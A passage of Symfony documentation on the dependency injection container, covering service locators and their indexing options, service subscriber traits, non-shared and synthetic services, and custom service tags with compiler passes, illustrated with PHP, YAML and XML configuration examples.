        use Psr\Container\ContainerInterface;
        use Symfony\Component\DependencyInjection\Attribute\Autowire;

        class CommandBus
        {
            public function __construct(
                #[Autowire(service: 'app.command_handler_locator')]
                private ContainerInterface $locator,
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\CommandBus:
                arguments: ['@app.command_handler_locator']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>

                <service id="App\CommandBus">
                    <argument type="service" id="app.command_handler_locator"/>
                </service>

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\CommandBus;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(CommandBus::class)
                ->args([service('app.command_handler_locator')]);
        };

Using Service Locators in Compiler Passes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In :doc:`compiler passes </service_container/compiler_passes>` it's recommended
to use the :method:`Symfony\\Component\\DependencyInjection\\Compiler\\ServiceLocatorTagPass::register`
method to create the service locators. This will save you some boilerplate and
will share identical locators among all the services referencing them::

    use Symfony\Component\DependencyInjection\Compiler\ServiceLocatorTagPass;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    public function process(ContainerBuilder $container): void
    {
        // ...

        $locateableServices = [
            // ...
            'logger' => new Reference('logger'),
        ];

        $myService = $container->findDefinition(MyService::class);

        $myService->addArgument(ServiceLocatorTagPass::register($container, $locateableServices));
    }

Indexing the Collection of Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, services passed to the service locator are indexed using their service
IDs. You can change this behavior with two options of the tagged locator (``index_by``
and ``default_index_method``) which can be used independently or combined.

The ``index_by`` / ``indexAttribute`` Option
............................................

This option defines the name of the option/attribute that stores the value used
to index the services:

.. configuration-block::

    .. code-block:: php-attributes

        // src/CommandBus.php
        namespace App;

        use Psr\Container\ContainerInterface;
        use Symfony\Component\DependencyInjection\Attribute\TaggedLocator;

        class CommandBus
        {
            public function __construct(
                #[TaggedLocator('app.handler', indexAttribute: 'key')]
                private ContainerInterface $locator,
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Handler\One:
                tags:
                    - { name: 'app.handler', key: 'handler_one' }

            App\Handler\Two:
                tags:
                    - { name: 'app.handler', key: 'handler_two' }

            App\Handler\HandlerCollection:
                # inject all services tagged with app.handler as first argument
                arguments: [!tagged_locator { tag: 'app.handler', index_by: 'key' }]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Handler\One">
                    <tag name="app.handler" key="handler_one"/>
                </service>

                <service id="App\Handler\Two">
                    <tag name="app.handler" key="handler_two"/>
                </service>

                <service id="App\HandlerCollection">
                    <!-- inject all services tagged with app.handler as first argument -->
                    <argument type="tagged_locator" tag="app.handler" index-by="key"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(App\Handler\One::class)
                ->tag('app.handler', ['key' => 'handler_one'])
            ;

            $services->set(App\Handler\Two::class)
                ->tag('app.handler', ['key' => 'handler_two'])
            ;

            $services->set(App\Handler\HandlerCollection::class)
                // inject all services tagged with app.handler as first argument
                ->args([tagged_locator('app.handler', indexAttribute: 'key')])
            ;
        };

In this example, the ``index_by`` option is ``key``. All services define that
option/attribute, so that will be the value used to index the services. For example,
to get the ``App\Handler\Two`` service::

    // src/Handler/HandlerCollection.php
    namespace App\Handler;

    use Psr\Container\ContainerInterface;

    class HandlerCollection
    {
        public function getHandlerTwo(ContainerInterface $locator): mixed
        {
            // this value is defined in the `key` option of the service
            return $locator->get('handler_two');
        }

        // ...
    }

If some service doesn't define the option/attribute configured in ``index_by``,
Symfony applies this fallback process:

#. If the service class defines a static method called ``getDefault<CamelCase index_by value>Name``
   (in this example, ``getDefaultKeyName()``), call it and use the returned value;
#. Otherwise, fall back to the default behavior and use the service ID.

The ``default_index_method`` Option
...................................

This option defines the name of the service class method that will be called to
get the value used to index the services:

.. configuration-block::

    .. code-block:: php-attributes

        // src/CommandBus.php
        namespace App;

        use Psr\Container\ContainerInterface;
        use Symfony\Component\DependencyInjection\Attribute\TaggedLocator;

        class CommandBus
        {
            public function __construct(
                #[TaggedLocator('app.handler', 'defaultIndexMethod: 'getLocatorKey')]
                private ContainerInterface $locator,
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Handler\HandlerCollection:
                # inject all services tagged with app.handler as first argument
                arguments: [!tagged_locator { tag: 'app.handler', default_index_method: 'getLocatorKey' }]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\HandlerCollection">
                    <!-- inject all services tagged with app.handler as first argument -->
                    <argument type="tagged_locator" tag="app.handler" default-index-method="getLocatorKey"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $container->services()
                ->set(App\HandlerCollection::class)
                    ->args([tagged_locator('app.handler', defaultIndexMethod: 'getLocatorKey')])
            ;
        };

If some service class doesn't define the method configured in ``default_index_method``,
Symfony will fall back to using the service ID as its index inside the locator.

Combining the ``index_by`` and ``default_index_method`` Options
...............................................................

You can combine both options in the same locator. Symfony will process them in
the following order:

#. If the service defines the option/attribute configured in ``index_by``, use it;
#. If the service class defines the method configured in ``default_index_method``, use it;
#. Otherwise, fall back to using the service ID as its index inside the locator.

.. _service-subscribers-service-subscriber-trait:

Service Subscriber Trait
------------------------

The :class:`Symfony\\Contracts\\Service\\ServiceMethodsSubscriberTrait` provides an
implementation for :class:`Symfony\\Contracts\\Service\\ServiceSubscriberInterface`
that looks through all methods in your class that are marked with the
:class:`Symfony\\Contracts\\Service\\Attribute\\SubscribedService` attribute. It
describes the services needed by the class based on each method's return type.
The service id is ``__METHOD__``. This allows you to add dependencies to your
services based on type-hinted helper methods::

    // src/Service/MyService.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\Routing\RouterInterface;
    use Symfony\Contracts\Service\Attribute\SubscribedService;
    use Symfony\Contracts\Service\ServiceMethodsSubscriberTrait;
    use Symfony\Contracts\Service\ServiceSubscriberInterface;

    class MyService implements ServiceSubscriberInterface
    {
        use ServiceMethodsSubscriberTrait;

        public function doSomething(): void
        {
            // $this->router() ...
            // $this->logger() ...
        }

        #[SubscribedService]
        private function router(): RouterInterface
        {
            return $this->container->get(__METHOD__);
        }

        #[SubscribedService]
        private function logger(): LoggerInterface
        {
            return $this->container->get(__METHOD__);
        }
    }

.. versionadded:: 7.1

    The ``ServiceMethodsSubscriberTrait`` was introduced in Symfony 7.1.
    In previous Symfony versions it was called ``ServiceSubscriberTrait``.

This  allows you to create helper traits like RouterAware, LoggerAware, etc...
and compose your services with them::

    // src/Service/LoggerAware.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;
    use Symfony\Contracts\Service\Attribute\SubscribedService;

    trait LoggerAware
    {
        #[SubscribedService]
        private function logger(): LoggerInterface
        {
            return $this->container->get(__CLASS__.'::'.__FUNCTION__);
        }
    }

    // src/Service/RouterAware.php
    namespace App\Service;

    use Symfony\Component\Routing\RouterInterface;
    use Symfony\Contracts\Service\Attribute\SubscribedService;

    trait RouterAware
    {
        #[SubscribedService]
        private function router(): RouterInterface
        {
            return $this->container->get(__CLASS__.'::'.__FUNCTION__);
        }
    }

    // src/Service/MyService.php
    namespace App\Service;

    use Symfony\Contracts\Service\ServiceMethodsSubscriberTrait;
    use Symfony\Contracts\Service\ServiceSubscriberInterface;

    class MyService implements ServiceSubscriberInterface
    {
        use ServiceMethodsSubscriberTrait, LoggerAware, RouterAware;

        public function doSomething(): void
        {
            // $this->router() ...
            // $this->logger() ...
        }
    }

.. caution::

    When creating these helper traits, the service id cannot be ``__METHOD__``
    as this will include the trait name, not the class name. Instead, use
    ``__CLASS__.'::'.__FUNCTION__`` as the service id.

``SubscribedService`` Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can use the ``attributes`` argument of ``SubscribedService`` to add any
of the following dependency injection attributes:

* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autowire`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\TaggedIterator`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\TaggedLocator`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Target`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireDecorated`

Here's an example::

    // src/Service/MyService.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;
    use Symfony\Component\DependencyInjection\Attribute\Target;
    use Symfony\Component\Routing\RouterInterface;
    use Symfony\Contracts\Service\Attribute\SubscribedService;
    use Symfony\Contracts\Service\ServiceMethodsSubscriberTrait;
    use Symfony\Contracts\Service\ServiceSubscriberInterface;

    class MyService implements ServiceSubscriberInterface
    {
        use ServiceMethodsSubscriberTrait;

        public function doSomething(): void
        {
            // $this->environment() ...
            // $this->router() ...
            // $this->logger() ...
        }

        #[SubscribedService(attributes: new Autowire('%kernel.environment%'))]
        private function environment(): string
        {
            return $this->container->get(__METHOD__);
        }

        #[SubscribedService(attributes: new Autowire(service: 'router'))]
        private function router(): RouterInterface
        {
            return $this->container->get(__METHOD__);
        }

        #[SubscribedService(attributes: new Target('requestLogger'))]
        private function logger(): LoggerInterface
        {
            return $this->container->get(__METHOD__);
        }
    }

.. note::

    The above example requires using ``3.2`` version or newer of ``symfony/service-contracts``.

Testing a Service Subscriber
----------------------------

To unit test a service subscriber, you can create a fake container::

    use Symfony\Contracts\Service\ServiceLocatorTrait;
    use Symfony\Contracts\Service\ServiceProviderInterface;

    // Create the fake services
    $foo = new stdClass();
    $bar = new stdClass();
    $bar->foo = $foo;

    // Create the fake container
    $container = new class([
        'foo' => fn () => $foo,
        'bar' => fn () => $bar,
    ]) implements ServiceProviderInterface {
        use ServiceLocatorTrait;
    };

    // Create the service subscriber
    $serviceSubscriber = new MyService($container);
    // ...

.. note::

    When defining the service locator like this, beware that the
    :method:`Symfony\\Contracts\\Service\\ServiceLocatorTrait::getProvidedServices`
    of your container will use the return type of the closures as the values of the
    returned array. If no return type is defined, the value will be ``?``. If you
    want the values to reflect the classes of your services, the return type has
    to be set on your closures.

Another alternative is to mock it using ``PHPUnit``::

    use Psr\Container\ContainerInterface;

    $container = $this->createMock(ContainerInterface::class);
    $container->expects(self::any())
        ->method('get')
        ->willReturnMap([
            ['foo', $this->createStub(Foo::class)],
            ['bar', $this->createStub(Bar::class)],
        ])
    ;

    $serviceSubscriber = new MyService($container);
    // ...

.. _`Command pattern`: https://en.wikipedia.org/wiki/Command_pattern
.. _`PSR-11 container`: https://www.php-fig.org/psr/psr-11/
How to Define Non Shared Services
=================================

In the service container, all services are shared by default. This means that
each time you retrieve the service, you'll get the *same* instance. This is
usually the behavior you want, but in some cases, you might want to always get a
*new* instance.

In order to always get a new instance, set the ``shared`` setting to ``false``
in your service definition:

.. configuration-block::

    .. code-block:: php-attributes

        // src/SomeNonSharedService.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\Autoconfigure;

        #[Autoconfigure(shared: false)]
        class SomeNonSharedService
        {
            // ...
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\SomeNonSharedService:
                shared: false
                # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <services>
            <service id="App\SomeNonSharedService" shared="false"/>
        </services>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\SomeNonSharedService;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(SomeNonSharedService::class)
                ->share(false);
        };

Now, whenever you request the ``App\SomeNonSharedService`` from the container,
you will be passed a new instance.
How to Inject Instances into the Container
------------------------------------------

In some applications, you may need to inject a class instance as service,
instead of configuring the container to create a new instance.

For instance, the ``kernel`` service in Symfony is injected into the container
from within the ``Kernel`` class::

    // ...
    use Symfony\Component\HttpKernel\KernelInterface;
    use Symfony\Component\HttpKernel\TerminableInterface;

    abstract class Kernel implements KernelInterface, TerminableInterface
    {
        // ...

        protected function initializeContainer(): void
        {
            // ...
            $this->container->set('kernel', $this);

            // ...
        }
    }

Services that are set at runtime are called *synthetic services*. This service
has to be configured so the container knows the service exists during compilation
(otherwise, services depending on ``kernel`` will get a "service does not exist" error).

In order to do so, mark the service as synthetic in your service definition
configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # synthetic services don't specify a class
            app.synthetic_service:
                synthetic: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>

                <!-- synthetic services don't specify a class -->
                <service id="app.synthetic_service" synthetic="true"/>

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // synthetic services don't specify a class
            $services->set('app.synthetic_service')
                ->synthetic();
        };

Now, you can inject the instance in the container using
:method:`Container::set() <Symfony\\Component\\DependencyInjection\\Container::set>`::

    // instantiate the synthetic service
    $theService = ...;
    $container->set('app.synthetic_service', $theService);
How to Work with Service Tags
=============================

**Service tags** are a way to tell Symfony or other third-party bundles that
your service should be registered in some special way. Take the following
example:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Twig\AppExtension:
                tags: ['twig.extension']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\AppExtension">
                    <tag name="twig.extension"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Twig\AppExtension;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(AppExtension::class)
                ->tag('twig.extension');
        };

Services tagged with the ``twig.extension`` tag are collected during the
initialization of TwigBundle and added to Twig as extensions.

Other tags are used to integrate your services into other systems. For a list of
all the tags available in the core Symfony Framework, check out
:doc:`/reference/dic_tags`. Each of these has a different effect on your service
and many tags require additional arguments (beyond the ``name`` parameter).

**For most users, this is all you need to know**. If you want to go further and
learn how to create your own custom tags, keep reading.

.. _di-instanceof:

Autoconfiguring Tags
--------------------

If you enable :ref:`autoconfigure <services-autoconfigure>`, then some tags are
automatically applied for you. That's true for the ``twig.extension`` tag: the
container sees that your class extends ``AbstractExtension`` (or more accurately,
that it implements ``ExtensionInterface``) and adds the tag for you.

If you want to apply tags automatically for your own services, use the
``_instanceof`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # this config only applies to the services created by this file
            _instanceof:
                # services whose classes are instances of CustomInterface will be tagged automatically
                App\Security\CustomInterface:
                    tags: ['app.custom_tag']
            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">
            <services>
                <!-- this config only applies to the services created by this file -->
                <instanceof id="App\Security\CustomInterface" autowire="true">
                    <!-- services whose classes are instances of CustomInterface will be tagged automatically -->
                    <tag name="app.custom_tag"/>
                </instanceof>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Security\CustomInterface;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            // this config only applies to the services created by this file
            $services
                ->instanceof(CustomInterface::class)
                    // services whose classes are instances of CustomInterface will be tagged automatically
                    ->tag('app.custom_tag');
        };

.. caution::

    If you're using PHP configuration, you need to call ``instanceof`` before
    any service registration to make sure tags are correctly applied.

It is also possible to use the ``#[AutoconfigureTag]`` attribute directly on the
base class or interface::

    // src/Security/CustomInterface.php
    namespace App\Security;

    use Symfony\Component\DependencyInjection\Attribute\AutoconfigureTag;

    #[AutoconfigureTag('app.custom_tag')]
    interface CustomInterface
    {
        // ...
    }

.. tip::

    If you need more capabilities to autoconfigure instances of your base class
    like their laziness, their bindings or their calls for example, you may rely
    on the :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autoconfigure` attribute.

For more advanced needs, you can define the automatic tags using the
:method:`Symfony\\Component\\DependencyInjection\\ContainerBuilder::registerForAutoconfiguration` method.

In a Symfony application, call this method in your kernel class::

    // src/Kernel.php
    class Kernel extends BaseKernel
    {
        // ...

        protected function build(ContainerBuilder $container): void
        {
            $container->registerForAutoconfiguration(CustomInterface::class)
                ->addTag('app.custom_tag')
            ;
        }
    }

In a Symfony bundle, call this method in the ``load()`` method of the
:doc:`bundle extension class </bundles/extension>`::

    // src/DependencyInjection/MyBundleExtension.php
    class MyBundleExtension extends Extension
    {
        // ...

        public function load(array $configs, ContainerBuilder $container): void
        {
            $container->registerForAutoconfiguration(CustomInterface::class)
                ->addTag('app.custom_tag')
            ;
        }
    }

Autoconfiguration registering is not limited to interfaces. It is possible
to use PHP attributes to autoconfigure services by using the
:method:`Symfony\\Component\\DependencyInjection\\ContainerBuilder::registerAttributeForAutoconfiguration`
method::

    // src/Attribute/SensitiveElement.php
    namespace App\Attribute;

    #[\Attribute(\Attribute::TARGET_CLASS)]
    class SensitiveElement
    {
        public function __construct(
            private string $token,
        ) {
        }

        public function getToken(): string
        {
            return $this->token;
        }
    }

    // src/Kernel.php
    use App\Attribute\SensitiveElement;

    class Kernel extends BaseKernel
    {
        // ...

        protected function build(ContainerBuilder $container): void
        {
            // ...

            $container->registerAttributeForAutoconfiguration(SensitiveElement::class, static function (ChildDefinition $definition, SensitiveElement $attribute, \ReflectionClass $reflector): void {
                // Apply the 'app.sensitive_element' tag to all classes with SensitiveElement
                // attribute, and attach the token value to the tag
                $definition->addTag('app.sensitive_element', ['token' => $attribute->getToken()]);
            });
        }
    }

You can also make attributes usable on methods. To do so, update the previous
example and add ``Attribute::TARGET_METHOD``::

    // src/Attribute/SensitiveElement.php
    namespace App\Attribute;

    #[\Attribute(\Attribute::TARGET_CLASS | \Attribute::TARGET_METHOD)]
    class SensitiveElement
    {
        // ...
    }

Then, update the :method:`Symfony\\Component\\DependencyInjection\\ContainerBuilder::registerAttributeForAutoconfiguration`
call to support ``ReflectionMethod``::

    // src/Kernel.php
    use App\Attribute\SensitiveElement;

    class Kernel extends BaseKernel
    {
        // ...

        protected function build(ContainerBuilder $container): void
        {
            // ...

            $container->registerAttributeForAutoconfiguration(SensitiveElement::class, static function (
                ChildDefinition $definition,
                SensitiveElement $attribute,
                // update the union type to support multiple types of reflection
                // you can also use the "\Reflector" interface
                \ReflectionClass|\ReflectionMethod $reflector): void {
                    if ($reflection instanceof \ReflectionMethod) {
                        // ...
                    }
                }
            );
        }
    }

.. tip::

    You can also define an attribute to be usable on properties and parameters with
    ``Attribute::TARGET_PROPERTY`` and ``Attribute::TARGET_PARAMETER``; then support
    ``ReflectionProperty`` and ``ReflectionParameter`` in your
    :method:`Symfony\\Component\\DependencyInjection\\ContainerBuilder::registerAttributeForAutoconfiguration`
    callable.

Creating custom Tags
--------------------

Tags on their own don't actually alter the functionality of your services in
any way. But if you choose to, you can ask a container builder for a list of
all services that were tagged with some specific tag. This is useful in
compiler passes where you can find these services and use or modify them in
some specific way.

For example, if you are using the Symfony Mailer component you might want
to implement a "transport chain", which is a collection of classes implementing
``\MailerTransport``. Using the chain, you'll want Mailer to try several
ways of transporting the message until one succeeds.

To begin with, define the ``TransportChain`` class::

    // src/Mail/TransportChain.php
    namespace App\Mail;

    class TransportChain
    {
        private array $transports = [];

        public function addTransport(\MailerTransport $transport): void
        {
            $this->transports[] = $transport;
        }
    }

Then, define the chain as a service:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Mail\TransportChain: ~

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mail\TransportChain"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\TransportChain;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(TransportChain::class);
        };

Define Services with a Custom Tag
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now you might want several of the ``\MailerTransport`` classes to be instantiated
and added to the chain automatically using the ``addTransport()`` method.
For example, you may add the following transports as services:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            MailerSmtpTransport:
                arguments: ['%mailer_host%']
                tags: ['app.mail_transport']

            MailerSendmailTransport:
                tags: ['app.mail_transport']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="MailerSmtpTransport">
                    <argument>%mailer_host%</argument>

                    <tag name="app.mail_transport"/>
                </service>

                <service id="MailerSendmailTransport">
                    <tag name="app.mail_transport"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(\MailerSmtpTransport::class)
                ->args([param('mailer_host')])
                ->tag('app.mail_transport')
            ;

            $services->set(\MailerSendmailTransport::class)
                ->tag('app.mail_transport')
            ;
        };

Notice that each service was given a tag named ``app.mail_transport``. This is
the custom tag that you'll use in your compiler pass. The compiler pass is what
makes this tag "mean" something.

.. _service-container-compiler-pass-tags:

Create a Compiler Pass
~~~~~~~~~~~~~~~~~~~~~~

You can now use a :ref:`compiler pass <components-di-separate-compiler-passes>` to ask the
container for any services with the ``app.mail_transport`` tag::

    // src/DependencyInjection/Compiler/MailTransportPass.php
    namespace App\DependencyInjection\Compiler;

    use App\Mail\TransportChain;
    use Symfony\Component\DependencyInjection\Compiler\CompilerPassInterface;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    class MailTransportPass implements CompilerPassInterface
    {
        public function process(ContainerBuilder $container): void
        {
            // always first check if the primary service is defined
            if (!$container->has(TransportChain::class)) {
                return;
            }

            $definition = $container->findDefinition(TransportChain::class);

            // find all service IDs with the app.mail_transport tag
            $taggedServices = $container->findTaggedServiceIds('app.mail_transport');

            foreach ($taggedServices as $id => $tags) {
                // add the transport service to the TransportChain service
                $definition->addMethodCall('addTransport', [new Reference($id)]);
            }
        }
    }

Register the Pass with the Container
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In order to run the compiler pass when the container is compiled, you have to
add the compiler pass to the container in a :doc:`bundle extension </bundles/extension>`
or from your kernel::

    // src/Kernel.php
    namespace App;

    use App\DependencyInjection\Compiler\MailTransportPass;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;
    // ...

    class Kernel extends BaseKernel
    {
        // ...

        protected function build(ContainerBuilder $container): void
        {
            $container->addCompilerPass(new MailTransportPass());
        }
    }

.. tip::

    When implementing the ``CompilerPassInterface`` in a service extension, you
    do not need to register it. See the
    :ref:`components documentation <components-di-compiler-pass>` for more
    information.

.. _tags_additional-attributes:

Adding Additional Attributes on Tags
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes you need additional information about each service that's tagged
with your tag. For example, you might want to add an alias to each member
of the transport chain.

To begin with, change the ``TransportChain`` class::

    class TransportChain
    {
        private array $transports = [];

        public function addTransport(\MailerTransport $transport, $alias): void
        {
            $this->transports[$alias] = $transport;
        }

        public function getTransport($alias): ?\MailerTransport
        {
            return $this->transports[$alias] ?? null;
        }
    }

As you can see, when ``addTransport()`` is called, it takes not only a ``MailerTransport``
object, but also a string alias for that transport. So, how can you allow
each tagged transport service to also supply an alias?

To answer this, change the service declaration:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            MailerSmtpTransport:
                arguments: ['%mailer_host%']
                tags:
                    - { name: 'app.mail_transport', alias: 'smtp' }

            MailerSendmailTransport:
                tags:
                    - { name: 'app.mail_transport', alias: ['sendmail', 'anotherAlias']}

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="MailerSmtpTransport">
                    <argument>%mailer_host%</argument>

                    <tag name="app.mail_transport" alias="smtp"/>
                </service>

                <service id="MailerSendmailTransport">
                    <tag name="app.mail_transport">
                        <attribute name="alias">
                            <attribute name="0">sendmail</attribute>
                            <attribute name="1">anotherAlias</attribute>
                        </attribute>
                    </tag>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(\MailerSmtpTransport::class)
                ->args([param('mailer_host')])
                ->tag('app.mail_transport', ['alias' => 'smtp'])
            ;

            $services->set(\MailerSendmailTransport::class)
                ->tag('app.mail_transport', ['alias' => ['sendmail', 'anotherAlias']])
            ;
        };

.. tip::

    The ``name`` attribute is used by default to define the name of the tag.
    If you want to add a ``name`` attribute to some tag in XML or YAML formats,
    you need to use this special syntax:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                MailerSmtpTransport:
                    arguments: ['%mailer_host%']
                    tags:
                        # this is a tag called 'app.mail_transport'
                        - { name: 'app.mail_transport', alias: 'smtp' }
                        # this is a tag called 'app.mail_transport' with two attributes ('name' and 'alias')
                        - app.mail_transport: { name: 'arbitrary-value', alias: 'smtp' }

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <services>
                    <service id="MailerSmtpTransport">
                        <argument>%mailer_host%</argument>
                        <!-- this is a tag called 'app.mail_transport' -->
                        <tag name="app.mail_transport" alias="sendmail"/>
                        <!-- this is a tag called 'app.mail_transport' with two attributes ('name' and 'alias') -->
                        <tag name="arbitrary-value" alias="smtp">app.mail_transport</tag>
                    </service>
                </services>
            </container>

.. tip::

    In YAML format, you may provide the tag as a simple string as long as
    you don't need to specify additional attributes. The following definitions
    are equivalent.

    .. code-block:: yaml

        # config/services.yaml
        services:
            # Compact syntax
            MailerSendmailTransport:
                class: \MailerSendmailTransport
                tags: ['app.mail_transport']

            # Verbose syntax
            MailerSendmailTransport:
                class: \MailerSendmailTransport
                tags:
                    - { name: 'app.mail_transport' }

Notice that you've added a generic ``alias`` key to the tag. To actually
use this, update the compiler::

    use Symfony\Component\DependencyInjection\Compiler\CompilerPassInterface;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    class TransportCompilerPass implements CompilerPassInterface
    {
        public function process(ContainerBuilder $container): void
        {
            // ...

            foreach ($taggedServices as $id => $tags) {

                // a service could have the same tag twice
                foreach ($tags as $attributes) {
                    $definition->addMethodCall('addTransport', [
                        new Reference($id),
                        $attributes['alias'],
                    ]);
                }
            }
        }
    }

The double loop may be confusing. This is because a service can have more
than one tag. You tag a service twice or more with the ``app.mail_transport``
tag. The second ``foreach`` loop iterates over the ``app.mail_transport``
tags set for the current service and gives you the attributes.

.. _tags_reference-tagged-services:

Reference Tagged Services
~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides a shortcut to inject all services tagged with a specific tag,
which is a common need in some applications, so you don't have to write a
compiler pass just for that.

Consider the following ``HandlerCollection`` class where you want to inject
